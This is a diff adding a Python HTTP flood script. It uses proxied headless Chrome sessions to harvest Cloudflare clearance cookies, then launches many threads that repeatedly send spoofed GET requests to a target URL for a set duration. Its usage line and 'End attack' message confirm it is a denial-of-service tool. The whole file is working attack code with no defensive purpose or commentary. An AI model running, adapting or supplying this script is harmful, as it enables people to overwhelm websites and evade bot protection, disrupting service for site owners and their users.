@@ -1,0 +1,144 @@
+# -*- coding: utf-8 -*-
+import threading, datetime, time, sys, socket, socks, ssl, random
+import undetected_chromedriver as webdriver
+from urllib.parse import urlparse
+from colorama import Fore, init
+init(convert=True)
+
+def get_cookie(proxy, url, thread_num, ranua):
+    global failed, success
+    options = webdriver.ChromeOptions()
+    options.add_argument('--proxy-server={0}'.format(proxy))
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-setuid-sandbox')
+    options.add_argument('--disable-infobars')
+    options.add_argument('--disable-logging')
+    options.add_argument('--disable-login-animations')
+    options.add_argument('--disable-notifications')
+    options.add_argument('--disable-gpu')
+    options.add_argument('--incognito')
+    options.add_argument('--headless')
+    options.add_argument('--lang=ko_KR')
+    options.add_argument("--start-maxmized")
+    options.add_argument('--user-agent='+ranua)
+    try:
+        driver = webdriver.Chrome(options=options)
+        driver.get(url)
+        driver.implicitly_wait(5)
+        tr, loop = 1, 0
+        while tr == 1:
+            if loop == 15:
+                failed += 1
+                print("#"+str(thread_num)+" Failed : Proxy Connection Error" + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]")
+                return
+            cookies = driver.get_cookies()
+            tryy = 0
+            for i in cookies:
+                if i['name'] == 'cf_clearance':
+                    cookieJAR = driver.get_cookies()[tryy]
+                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                    driver.quit()
+                    tr = 0
+                else:
+                    tryy += 1
+                    pass
+            loop += 1
+            time.sleep(1)
+        driver.quit()
+        success += 1
+        print(Fore.LIGHTGREEN_EX+"#"+str(thread_num)+" Success : "+proxy+ " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+Fore.RESET)
+        threading.Thread(target=ready, args=(proxy, cookie, url, ranua)).start()
+    except :
+        failed += 1
+        print("#"+str(thread_num)+" Failed : Proxy Error" + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]")
+
+def ready(proxy, cookie, url, ranua):
+    target = {}
+    target['uri'] = urlparse(url).path
+    if target['uri'] == "":
+        target['uri'] = "/"
+    target['host'] = urlparse(url).netloc
+    target['scheme'] = urlparse(url).scheme
+    if ":" in urlparse(url).netloc:
+        target['port'] = urlparse(url).netloc.split(":")[1]
+    else:
+        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
+        pass
+    px = proxy.split(":")
+    
+    for _ in range(int(thr)):
+        try:
+            threading.Thread(target=launch, args=(px, cookie, target, ranua)).start()
+        except:
+            pass
+
+def launch(px, cookie, target, ranua):
+    req =  'GET '+target['uri']+' HTTP/1.1\r\n'
+    req += 'Host: ' + target['host'] + '\r\n'
+    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
+    req += 'Accept-Encoding: gzip, deflate, br\r\n'
+    req += 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
+    req += 'Cache-Control: max-age=0\r\n'
+    req += 'Cookie: ' + cookie + '\r\n'
+    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
+    req += 'sec-ch-ua-mobile: ?0\r\n'
+    req += 'sec-ch-ua-platform: "Windows"\r\n'
+    req += 'sec-fetch-dest: empty\r\n'
+    req += 'sec-fetch-mode: cors\r\n'
+    req += 'sec-fetch-site: same-origin\r\n'
+    req += 'Connection: Keep-Alive\r\n'
+    req += 'User-Agent: '+ ranua + '\r\n\r\n\r\n'
+    try:
+        if target['scheme'] == 'https':
+            packet = socks.socksocket()
+            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
+            packet.connect((str(target['host']), int(target['port'])))
+            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+        else:
+            packet = socks.socksocket()
+            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
+            packet.connect((str(target['host']), int(target['port'])))
+    except:
+        return
+    while (until_time - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            for _ in range(100):
+                packet.send(str.encode(req))
+                time.sleep(0.001*int(interval))
+        except:
+            packet.close()
+            pass
+
+def main():
+    global failed, success, total, until_time, thr, interval
+    failed, success, total, thread_num = 0, 0, 0, 0
+    try:
+        url = sys.argv[1]
+        until = sys.argv[2]
+        proxypath = sys.argv[4]
+        thr = sys.argv[3]
+        interval = sys.argv[5]
+    except IndexError:
+        print(f"usage: python3 {sys.argv[0]} <target> <time:s> <thread> <proxypath> <interval:ms>")
+        sys.exit()
+    ua = open('./ua.txt', 'r').read().split('\n')
+    until_time = datetime.datetime.now() + datetime.timedelta(seconds=int(until))
+    for _ in open(proxypath, encoding="utf-8"):
+        total += 1
+    print("## Start with "+str(total)+" proxies...")
+    for line in open(proxypath, encoding="utf-8"):
+        line = line.strip()
+        thread_num += 1
+        ranua = random.choice(list(ua))
+        threading.Thread(target=get_cookie, args=(line, url, thread_num, ranua)).start()
+        print("#"+str(thread_num)+" Get cookie => "+line)
+        
+    print("# Wait for solve cookie")
+    time.sleep(int(until))
+    print("# End attack")
+    sys.exit()
+
+if __name__ == '__main__':
+    main()
